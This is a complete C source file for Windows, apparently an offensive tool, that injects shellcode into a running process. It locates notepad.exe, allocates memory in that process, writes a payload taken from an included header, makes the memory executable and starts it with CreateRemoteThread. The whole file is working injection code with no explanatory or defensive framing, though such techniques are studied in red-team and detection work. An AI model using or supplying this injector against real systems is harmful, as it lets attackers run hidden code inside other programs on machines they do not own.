#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "Payload.h"

DWORD FindPID( LPCSTR procName ) {

    HANDLE hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
    if ( hSnapshot == INVALID_HANDLE_VALUE ) {
        fprintf( stderr, "[-] Failed to create snapshot." );
        return 0;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof( PROCESSENTRY32 );
    DWORD pid = 0;

    if ( Process32First( hSnapshot, &pe ) ) {
        do {
            if ( strcmp( pe.szExeFile, procName ) == 0 ) {
                pid = pe.th32ProcessID;
                break;
            }
        } while ( Process32Next( hSnapshot, &pe ) );
    }

    CloseHandle( hSnapshot );
    return pid;
}


BOOL RemoteInject( DWORD pid ) {

    HANDLE hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid );
    if ( !hProcess ) {
        fprintf( stderr, "[-] Failed to open target process.\n" );
        return FALSE;
    }


    LPVOID pRemoteMemory = VirtualAllocEx( hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

    if ( !pRemoteMemory ) {
        fprintf( stderr, "[-] VirtualAllocEx failed with error: %ld\n", GetLastError() );
        CloseHandle( hProcess );
        return FALSE;
    }

    SIZE_T bytesWritten;
    if ( !WriteProcessMemory( hProcess, pRemoteMemory, payload, payloadSize, &bytesWritten ) || bytesWritten != payloadSize ) {
        fprintf( stderr, "[-] WriteProcessMemory failed with error: %ld\n", GetLastError() );
        VirtualFreeEx( hProcess, pRemoteMemory, 0, MEM_RELEASE );
        CloseHandle( hProcess );
        return FALSE;
    }

    DWORD oldProtect;
    if ( !VirtualProtectEx( hProcess, pRemoteMemory, payloadSize, PAGE_EXECUTE_READ, &oldProtect ) ) {
        fprintf( stderr, "[-] VirtualProtectEx failed with error: %ld\n", GetLastError() );
        VirtualFreeEx( hProcess, pRemoteMemory, 0, MEM_RELEASE );
        CloseHandle( hProcess );
        return FALSE;
    }


    HANDLE hThread = CreateRemoteThread( hProcess, NULL, 0, ( LPTHREAD_START_ROUTINE )pRemoteMemory, NULL, 0, NULL );
    if ( !hThread ) {
        fprintf( stderr, "[-] CreateRemoteThread failed with error: %ld\n", GetLastError() );
        VirtualFreeEx( hProcess, pRemoteMemory, 0, MEM_RELEASE );
        CloseHandle( hProcess );
        return FALSE;
    }

    WaitForSingleObject( hThread, INFINITE );
    CloseHandle( hThread );
    VirtualFreeEx( hProcess, pRemoteMemory, 0, MEM_RELEASE );
    CloseHandle( hProcess );

    return TRUE;
}

int main() {

    LPCSTR procName = "notepad.exe";

    DWORD pid = FindPID( procName );
    if ( !pid ) {
        fprintf( stderr, "[-] Failed to find process ID for %s\n", procName );
        return 1;
    }

    if ( !RemoteInject( pid ) ) {
        fprintf( stderr, "[-] Remote injection failed.\n" );
        return 1;
    }

    printf( "[+] Remote injection successful.\n" );

    return 0;
}